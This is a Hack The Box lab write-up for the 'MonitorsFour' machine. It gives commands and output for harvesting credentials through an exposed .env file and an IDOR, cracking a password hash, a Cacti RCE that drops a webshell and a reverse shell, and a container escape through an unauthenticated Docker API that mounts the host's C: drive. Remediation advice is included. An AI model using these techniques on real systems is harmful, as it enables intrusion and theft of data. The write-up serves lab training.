---
title: MonitorsFour
type: htb-writeup
source: Hack The Box
platform: Windows / containers
difficulty: Medium
tags: [htb, writeup, windows, web, idor, docker, container-escape]
---

# MonitorsFour

## Fast lookup

- Start with [web discovery and access control](../../OSCP/03-Initial-Access/Techniques/Web/02-Web-Discovery-and-Access-Control.md).
- For the container and privileged-process branch, review [Linux privilege escalation](../../OSCP/04-Linux-Escalation/Techniques/Linux/04-Linux-Privilege-Escalation.md).
- Tool syntax: [web reference](../../OSCP/Reference/Web.md) and [Linux reference](../../OSCP/Reference/Linux.md).

## Attack path

```
Exposed /.env → IDOR token leak → Cacti admin login
  → CVE-2025-22604 RCE (www-data in container)
  → unauthenticated Docker API (TCP/2375)
  → WSL2 bind mount of Windows C: → root.txt
```

## Machine overview

| Field | Value |
|---|---|
| Hostname | `monitorsfour.htb` |
| OS | Windows (WSL2 / Docker Desktop) |
| Web stack | nginx + PHP (Cacti) |
| Container runtime | Docker Engine 28.3.2 (WSL2-backed) |

## Attack surface

| # | Finding | Severity | Used for |
|---|---|---|---|
| 1 | Exposed `.env` file | High | DB creds + service fingerprinting |
| 2 | IDOR on `/user?token=` | High | Admin credential leak |
| 3 | PHP type juggling (`0e` tokens) | Medium | Authentication bypass vector |
| 4 | CVE-2025-22604 (Cacti RCE) | Critical | Initial shell as `www-data` |
| 5 | Unauthenticated Docker API on TCP/2375 | Critical | Container escape → root flag |
| 6 | WSL2 bind mount (`/mnt/host/c`) | Critical | Host filesystem access |

## Phase 1 — Reconnaissance

### Port scan
```bash
sudo nmap 10.129.2.48 -Pn -T5 -sV -sC --open --reason -oN monitorsfour
```
```
80/tcp   open  http    nginx (redirects to http://monitorsfour.htb/)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```
TTL 127 indicates a Windows host. WinRM on 5985 was tested later with recovered creds but the account lacked WinRM access.

### Virtual host setup
```bash
echo "10.129.2.48 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Directory enumeration
```bash
feroxbuster -u http://monitorsfour.htb -k
```
```
200  /user           (35c — anomalously small; likely needs params)
200  /forgot-password
200  /login
301  /views/  /controllers/
```

### Vulnerability scan
```bash
nuclei -target monitorsfour.htb
```
```
[codeigniter-env] [high]  http://monitorsfour.htb/.env
[laravel-env]     [high]  http://monitorsfour.htb/.env
```

## Phase 2 — Web enumeration & credential harvesting

### Exposed `.env`
```bash
curl http://monitorsfour.htb/.env
```
```env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
`DB_HOST=mariadb` resolving as a container name confirms a Docker network — critical in Phase 4.

### Parameter discovery & IDOR
The `/user` endpoint (35 bytes) accepts a hidden parameter:
```bash
arjun -u http://monitorsfour.htb/user
# [+] Parameters found: token

ffuf -u "http://monitorsfour.htb/user?token=FUZZ" \
     -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt -ac
# 000  [Status: 200, Size: 1113]
```
`token=000` returns the full user DB dump — a classic IDOR (the app maps tokens to records without verifying ownership).

### Token dump & PHP type juggling
```json
[
  {"id":2,"username":"admin","email":"admin@monitorsfour.htb",
   "password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",
   "token":"8024b78f83f102da4f"},
  {"id":5,"username":"mwatson","token":"0e543210987654321"},
  {"id":6,"username":"janderson","token":"0e999999999999999"},
  {"id":7,"username":"dthompson","token":"0e111111111111111"}
]
```
Three tokens begin with `0e`. PHP's loose `==` interprets `0e<digits>` as scientific notation (`0`), so all `0e...` tokens compare equal — an auth bypass vector if the backend uses `==` instead of `===`.

Crack the admin MD5:
```bash
hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
# wonderful1
```
Recovered: `admin@monitorsfour.htb : wonderful1`

### Cacti login
URL `http://cacti.monitorsfour.htb/cacti/` with `admin:wonderful1`. Cacti admin access is frequently equivalent to OS code execution because it runs graph data-collection scripts.

## Phase 3 — Foothold (CVE-2025-22604)

**CVE-2025-22604 — Cacti RRDtool graph template command injection** (CVSS 9.1, authenticated). Cacti passes user-controlled `right_axis_label` directly to `rrdtool graph` as shell arguments.

Injection point: `Graph Templates → Unix - Logged in Users → right_axis_label`.

Flow:
```
1. Login to Cacti as admin
2. Graph Templates → "Unix - Logged in Users"
3. Inject RRDTool command into right_axis_label
4. Command writes a PHP webshell to the Cacti web dir
5. Webshell fetches a bash reverse-shell payload from attacker HTTP server
6. Reverse shell connects back
```
```bash
nc -lvnp 4444              # listener
python3 -m http.server 8080 # payload delivery
```
```bash
id        # uid=33(www-data)
hostname  # 821fbd6a43fa  ← Docker container ID, not the Windows host
```
`user.txt` is in `/home/marcus`.

## Phase 4 — Privilege escalation via Docker API

Confirm we are in a container:
```bash
cat /proc/1/cgroup   # docker/<id>
ls /.dockerenv       # present
ip route             # default via 192.168.65.1
```
Probe the Docker Remote API:
```bash
curl -s http://192.168.65.7:2375/version
```
```json
{"Platform":{"Name":"Docker Engine - Community"},"Version":"28.3.2",
 "ApiVersion":"1.51","KernelVersion":"6.6.87.2-microsoft-standard-WSL2"}
```
Unauthenticated (no TLS, no token). The WSL2 kernel means the Windows C: drive is mounted at `/mnt/host/c` — a container bind mount can read the whole Windows filesystem.

> The live SAM hive is kernel-locked and cannot be copied even from a privileged container; read non-locked files (e.g. the Administrator Desktop) instead.

Create a container that bind-mounts C: and reads the root flag:
```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh","-c","cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": { "Binds": ["/mnt/host/c:/mnt/host_root"] },
  "Tty": true, "OpenStdin": true
}
```
```bash
# deliver the JSON into the compromised container, then:
curl -X POST -H "Content-Type: application/json" -d @mount-root.json \
  "http://192.168.65.7:2375/containers/create?name=natas"
curl -X POST "http://192.168.65.7:2375/containers/natas/start"   # 204 = started
curl "http://192.168.65.7:2375/containers/natas/logs?stdout=1" | strings
```
The Docker log API prepends an 8-byte frame header per line; `strings` strips it to return clean text — the `root.txt` value.

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed `.env` | `deny all` nginx rule for `/.env`; use a secrets manager |
| IDOR on token endpoint | Validate the session owns the requested token |
| PHP type juggling | Use `===` strict comparison |
| CVE-2025-22604 | Patch Cacti; sanitize RRDtool parameters |
| Docker API on 2375 | Bind to Unix socket only; never expose on TCP without mTLS |
| WSL2 filesystem exposure | Disable C: drive mounting in Docker Desktop |

---
*Migrated from local Obsidian lab notes. Review evidence before reuse.*
